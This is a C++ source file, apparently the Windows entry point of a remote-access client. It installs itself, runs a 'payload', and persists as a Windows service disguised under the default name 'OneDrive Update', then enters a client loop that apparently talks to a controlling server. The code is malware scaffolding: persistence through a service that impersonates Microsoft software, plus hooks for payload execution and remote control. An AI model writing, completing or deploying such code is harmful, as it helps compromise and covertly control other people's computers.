#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <shellapi.h>
#include <urlmon.h>
#include <string>
#include <atomic>

#include "../Common/Config.h"
#include "../Common/Utils.h"
#include "../Common/ClientCore.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "urlmon.lib")

using namespace Formidable;

// 服务主函数
void WINAPI ServiceMain(DWORD dwArgc, LPWSTR* lpszArgv) {
    g_IsService = true;
    
    std::wstring serviceName = L"OneDrive Update";
    std::wstring configInstallName = UTF8ToWide(g_ServerConfig.szInstallName);
    if (!configInstallName.empty()) {
        serviceName = configInstallName;
        if (serviceName.length() > 4 && _wcsicmp(serviceName.c_str() + serviceName.length() - 4, L".exe") == 0) {
            serviceName = serviceName.substr(0, serviceName.length() - 4);
        }
    }

    SERVICE_STATUS_HANDLE hStatus = RegisterServiceCtrlHandlerW(serviceName.c_str(), [](DWORD dwCtrl) {
        if (dwCtrl == SERVICE_CONTROL_STOP || dwCtrl == SERVICE_CONTROL_SHUTDOWN) {
            ExitProcess(0);
        }
    });

    if (hStatus) {
        SERVICE_STATUS status = { SERVICE_WIN32_OWN_PROCESS, SERVICE_RUNNING, SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN };
        SetServiceStatus(hStatus, &status);
    }

    // 在服务中启动主逻辑
    std::atomic<bool> bShouldExit(false);
    std::atomic<bool> bConnected(false);
    
    RunClientLoop(bShouldExit, bConnected);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    InitClientCore();

    // 检查是否作为服务启动
    std::wstring serviceName = L"OneDrive Update";
    std::wstring configInstallName = UTF8ToWide(g_ServerConfig.szInstallName);
    if (!configInstallName.empty()) {
        serviceName = configInstallName;
        if (serviceName.length() > 4 && _wcsicmp(serviceName.c_str() + serviceName.length() - 4, L".exe") == 0) {
            serviceName = serviceName.substr(0, serviceName.length() - 4);
        }
    }

    SERVICE_TABLE_ENTRYW ServiceTable[] = {
        { (LPWSTR)serviceName.c_str(), (LPSERVICE_MAIN_FUNCTIONW)ServiceMain },
        { NULL, NULL }
    };

    if (StartServiceCtrlDispatcherW(ServiceTable)) {
        CleanupClientCore();
        return 0;
    }

    // 正常启动逻辑
    InstallClient();
    ProcessPayload();

    std::atomic<bool> bShouldExit(false);
    std::atomic<bool> bConnected(false);

    RunClientLoop(bShouldExit, bConnected);

    CleanupClientCore();
    return 0;
}
